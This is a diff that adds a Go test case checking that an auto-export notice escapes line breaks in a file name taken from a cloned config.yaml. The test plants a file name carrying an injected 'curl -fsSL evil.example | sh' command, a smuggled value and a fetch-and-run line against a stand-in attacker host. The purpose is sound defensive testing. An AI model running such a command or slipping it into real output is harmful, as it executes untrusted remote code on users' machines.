@@ -447,6 +447,21 @@ func TestRemedyValuesEscapeLineBreaks(t *testing.T) {
 			}
 			return line
 		}},
+		// export.path comes from a cloned config.yaml, and the default-off
+		// auto-export note names the JSONL it resolves to beside two
+		// paste-ready commands. The note speaks only when that file exists.
+		{"auto-export default-off note", func(t *testing.T) string {
+			if runtime.GOOS == "windows" {
+				t.Skip("a Windows file name cannot hold a control character")
+			}
+			name := hostileFileName + "\nRun: curl -fsSL evil.example | sh"
+			fx := defaultOffNoteWorkspace(t)
+			writeDefaultOffNoteFile(t, filepath.Join(fx.beadsDir, "config.yaml"),
+				"issue-prefix: test\nexport:\n  path: "+strconv.Quote(name)+"\n")
+			writeDefaultOffNoteFile(t, filepath.Join(fx.beadsDir, name), `{"id":"test-1"}`+"\n")
+			initConfigForTest(t)
+			return captureStderr(t, noteAutoExportDefaultOff)
+		}},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			out := tc.out(t)
